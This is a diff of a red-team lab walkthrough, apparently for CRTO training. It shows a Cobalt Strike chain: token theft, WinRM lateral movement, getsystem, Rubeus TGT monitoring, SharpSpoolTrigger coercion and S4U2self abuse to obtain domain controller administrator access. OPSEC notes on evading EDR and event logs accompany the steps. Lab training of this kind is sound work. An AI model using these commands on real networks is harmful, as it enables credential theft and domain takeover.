@@ -25,55 +25,103 @@
 
 ## Lateral Movement to lon-ws-1
 
-Goal: get a beacon on `lon-ws-1` running as local admin (`rsteel`). SYSTEM is **not** required for this lab — you are capturing the DC's TGT via Rubeus monitor and coercion, not dumping the local machine account TGT via LUID `0x3e7`.
+Goal: get a beacon on `lon-ws-1`. SYSTEM is **not** strictly required for this lab — Rubeus monitor runs via execute-assembly. However, winrm64 lands as `rsteel` (not SYSTEM), so `getsystem` is needed before running Rubeus monitor, followed by `rev2self` (see Step 1 note below).
 
-1. On the existing beacon, open the process browser and find a process owned by `rsteel` (or any domain user with local admin on `lon-ws-1`):
+### Option A — steal_token (preferred, OPSEC-🟢SAFE)
 
-    ```Beacon-nocolor
-    process_browser
-    ```
-
-2. Steal the token of that process:
+1. On the existing beacon, run `ps` or `process_browser` and find a process owned by `rsteel`:
 
     ```Beacon-nocolor
-    steal_token <pid>
+    ps
     ```
 
-    > OPSEC-🟢SAFE — token impersonation in beacon thread, no process spawn.
+    Look for `cmd.exe` or `mmc.exe` owned by `CONTOSO\rsteel`.
 
-3. Set spawnto before jumping to avoid default `rundll32.exe` child process.
-   `ak-settings` is the Aggressor Kit command loaded in the CRTO lab environment:
+2. Steal the token:
+
+    ```Beacon-nocolor
+    steal_token <rsteel-pid>
+    ```
+
+    > OPSEC-🟢SAFE — token duplication in beacon thread, no logon event, no child process.
+
+3. Set spawnto before jumping:
 
     ```Beacon-nocolor
     ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
     ```
 
-    Equivalent standard CS command (if Aggressor Kit is not loaded):
+    > OPSEC-🟠CAUTION — sets the sacrificial process for fork & run. `dllhost.exe` blends with COM surrogate activity.
+
+4. Jump to lon-ws-1:
 
     ```Beacon-nocolor
-    spawnto x64 %windir%\sysnative\dllhost.exe
+    jump winrm64 lon-ws-1 smb_custom
     ```
 
-    > OPSEC-🟠CAUTION — sets the sacrificial process for any subsequent fork & run commands. `dllhost.exe` blends with normal COM surrogate activity.
+    > OPSEC-🟢SAFE — WinRM, no service modification, no disk write, no Event 7045.
 
-4. Move laterally to `lon-ws-1` — prefer WinRM, fall back to scshell if WinRM is blocked:
+5. Drop token on source beacon after jump succeeds:
 
     ```Beacon-nocolor
-    # OPSEC-SAFE (preferred) — WinRM, no service modification, no disk write on target
-    
-    jump winrm64 lon-ws-1 smb
-
-    # OPSEC-CAUTION (fallback) — SCShell modifies existing service ImagePath via SCM
-    # Generates: Event 7040 (service config changed), 4697, 4688
-    
-    jump scshell64 lon-ws-1 smb
+    rev2self
     ```
 
-5. Interact with the **new** beacon on `LON-WS-1`. Verify running as SYSTEM:
+### Option B — make_token + kerberos_ticket_use (when no rsteel process visible)
+
+1. Dump rsteel's TGT from the cached session:
 
     ```Beacon-nocolor
-    getuid
+    krb_triage
+    krb_dump /user:rsteel /service:krbtgt
     ```
+
+    > OPSEC-🟠CAUTION — Kerberos API call via `LsaCallAuthenticationPackage`. No raw LSASS read.
+
+2. Write the base64 TGT to a `.kirbi` file on the **attacker desktop** (local PowerShell — not via beacon):
+
+    ```powershell
+    [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[BASE64-TGT]"))
+    ```
+
+    > ⚠️ Lab-confirmed (2026-04-19): `kerberos_ticket_use` requires a **file path** — pasting base64 directly fails with `does not exist` error.
+
+3. Create a fake logon session and inject the TGT:
+
+    ```Beacon-nocolor
+    make_token CONTOSO\rsteel FakePass
+    kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
+    ```
+
+    > OPSEC-🟠CAUTION — `make_token` generates Event 4648.
+
+4. Jump to lon-ws-1:
+
+    ```Beacon-nocolor
+    jump winrm64 lon-ws-1 smb_custom
+    ```
+
+5. Drop token and purge on source beacon:
+
+    ```Beacon-nocolor
+    rev2self
+    kerberos_ticket_purge
+    ```
+
+### On the new lon-ws-1 beacon
+
+```Beacon-nocolor
+getuid
+```
+
+> ⚠️ Lab-confirmed (2026-04-19): `jump winrm64` lands as `CONTOSO\rsteel` (not SYSTEM) — WinRM injects into `wsmprovhost.exe` running as the authenticated user. SYSTEM context is needed before running Rubeus monitor. Use `getsystem`:
+
+```Beacon-nocolor
+getsystem
+getuid    # confirm NT AUTHORITY\SYSTEM
+```
+
+> OPSEC-🟠CAUTION — getsystem uses named pipe impersonation from admin context.
 
 ===
 
@@ -83,11 +131,16 @@ Goal: get a beacon on `lon-ws-1` running as local admin (`rsteel`). SYSTEM is **
 
 Monitors for incoming TGTs via SSPI as they arrive — no LSASS memory read.
 
+> ⚠️ Lab-confirmed (2026-04-19): `execute-assembly` **fails with "No .NET runtime found"** immediately after `getsystem`. The getsystem impersonation token breaks the fork-and-run .NET host. Fix: `rev2self` first, then run Rubeus monitor:
+
 ```Beacon-nocolor
+rev2self
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:3 /targetuser:lon-dc-1$ /nowrap
 ```
 
 > OPSEC-🟠CAUTION — fork & run into `dllhost.exe` (spawnto set above). Ticket capture itself uses Windows SSPI/Kerberos API — no direct LSASS read. `/targetuser` filters output to the DC machine account only, reducing noise.
+
+> ⚠️ After rev2self you will be back to `rsteel` context — that is fine. Rubeus monitor runs in the sacrificial process and captures tickets regardless of the beacon's impersonation state.
 
 ---
 
@@ -101,7 +154,9 @@ execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\Shar
 
 > OPSEC-🟠CAUTION — fork & run. Generates a 4648 logon event on `lon-dc-1` and MS-RPRN RPC traffic. Print Spooler must be running on the DC.
 
-⚠️ Rubeus monitor output should capture the TGT of `lon-dc-1$`. Copy the full base64 ticket string — paste it **directly into the `krb_s4u` command** below. No file write needed at this stage.
+> ⚠️ Lab-confirmed (2026-04-19): SharpSpoolTrigger may return `[-]RpcRemoteFindFirstPrinterChangeNotificationEx status: 6` (ERROR_INVALID_HANDLE) on both attempts. Despite this error, Rubeus monitor **still captured the DC TGT** — the unconstrained delegation host receives the TGT from any prior DC authentication, not only from the coercion trigger. If Rubeus monitor shows a TGT for `lon-dc-1$`, proceed regardless of SpoolTrigger error.
+
+⚠️ Rubeus monitor output should capture the TGT of `LON-DC-1$`. Copy the full base64 ticket string — paste it **directly into the `krb_s4u` command** below. No file write needed at this stage.
 
 ---
 
@@ -114,6 +169,12 @@ krb_s4u /ticket:[paste-base64-DC-TGT-here] /self /altservice:cifs/lon-dc-1 /impe
 ```
 
 > OPSEC-🟢SAFE — `krb_s4u` is a BOF. Runs in beacon thread, no child process, no disk write.
+
+> ⚠️ Lab-confirmed (2026-04-19): This command succeeded. Output confirms:
+> - `[*] Building S4U2self request for: 'LON-DC-1$@CONTOSO.COM'`
+> - `[+] S4U2self success!`
+> - `[*] Substituting alternative service name 'cifs/lon-dc-1'`
+> - `[*] Got a TGS for 'Administrator' to 'cifs@CONTOSO.COM'`
 
 ⚠️ `krb_s4u` outputs a **new** base64-encoded service ticket (this is a different ticket to the DC TGT). Copy this new base64 string — this one gets written to the `.kirbi` file in Step 4.
 
@@ -134,6 +195,8 @@ Run this on the attacker CS client (local PowerShell — **not** via beacon):
 
 > The `.kirbi` file is written to your **attacker desktop only** — nothing touches the target's disk. `kerberos_ticket_use` reads from the CS client and injects over the C2 channel.
 
+> ⚠️ Lab-confirmed (2026-04-19): `kerberos_ticket_use` requires a **file path** — attempting to pass the raw base64 string directly fails with error `'C:\Tools\cobaltstrike\client\[base64...]' does not exist`. Always write the `.kirbi` file first, then reference the file path.
+
 ---
 
 ### Step 5 — Inject the ticket and access the share
@@ -141,24 +204,44 @@ Run this on the attacker CS client (local PowerShell — **not** via beacon):
 Back in the beacon on **`lon-ws-1`** (not lon-dc-1 — you are accessing it remotely via the ticket):
 
 ```Beacon-nocolor
+// Option A — skip make_token (OPSEC-🟢SAFE — no Event 4648, preferred)
+kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi
+ls \\lon-dc-1\c$
+
+// Option B — with make_token (OPSEC-🟠CAUTION — Event 4648, cleaner session)
 make_token CONTOSO\Administrator FakePass
 kerberos_ticket_use C:\Users\Attacker\Desktop\cifs-lon-dc-1.kirbi
 ls \\lon-dc-1\c$
 ```
 
-> OPSEC-🟢SAFE — `make_token` creates a sacrificial logon session in-memory. `kerberos_ticket_use` injects the ticket into it — no disk write on target, no child process.
+> OPSEC-🟢SAFE — `kerberos_ticket_use` injects the ticket into the current logon session. `make_token` is optional — the remote server validates the Kerberos ticket content, not the local session identity.
 
 ⚠️ `ls \\lon-dc-1\c$` should succeed. If it fails with `ACCESS_DENIED`, verify:
 - `getuid` — confirm token is set
 - `run klist` — confirm the `cifs/lon-dc-1` ticket is present in the session (note: `run klist` spawns a child process — acceptable for quick verification only)
 - The SPN in `krb_s4u` exactly matches `cifs/lon-dc-1`
 
-Drop impersonation when done:
+Drop impersonation and purge ticket when done:
 
 ```Beacon-nocolor
 rev2self
+kerberos_ticket_purge
 ```
 
 ===
 
 ⚠️ In this lab, you have learned how to combine unconstrained delegation, remote authentication triggers, and S4U2Self to compromise domain controller `lon-dc-1` — converting an unusable DC machine account TGT into a valid `cifs` service ticket without touching LSASS directly.
+
+===
+
+## Lab Observations (2026-04-19)
+
+| Finding | Detail |
+|---------|--------|
+| `kerberos_ticket_use` rejects raw base64 | Passing base64 directly fails: CS treats the string as a file path and errors with `does not exist`. Must write `.kirbi` file first. |
+| `getsystem` breaks `execute-assembly` | After `getsystem`, Rubeus monitor fails: `No .NET runtime found`. Run `rev2self` before `execute-assembly`. The monitor job runs fine in rsteel admin context. |
+| `jump winrm64` lands as rsteel | WinRM injects into `wsmprovhost.exe` as the authenticated user — not SYSTEM. `getsystem` needed for SYSTEM context, but `rev2self` required before Rubeus. |
+| SharpSpoolTrigger `status: 6` | `RpcRemoteFindFirstPrinterChangeNotificationEx status: 6` = ERROR_INVALID_HANDLE. Both coercion attempts returned this error. Rubeus monitor still captured the DC TGT from a prior natural authentication — the unconstrained host had the TGT cached already. |
+| `smb_custom` listener worked first attempt | No retry required with custom pipe name (vs TSVCPIPE-* default). |
+| `krb_s4u /self` succeeded | LON-DC-1$ TGT → `cifs/lon-dc-1` service ticket for Administrator. Confirmed S4U2self flow end-to-end. |
+| EDR on lon-ws-1 | Elastic Endpoint, MsMpEng, Sysmon64 present — spawnto override and custom SMB pipe required. |
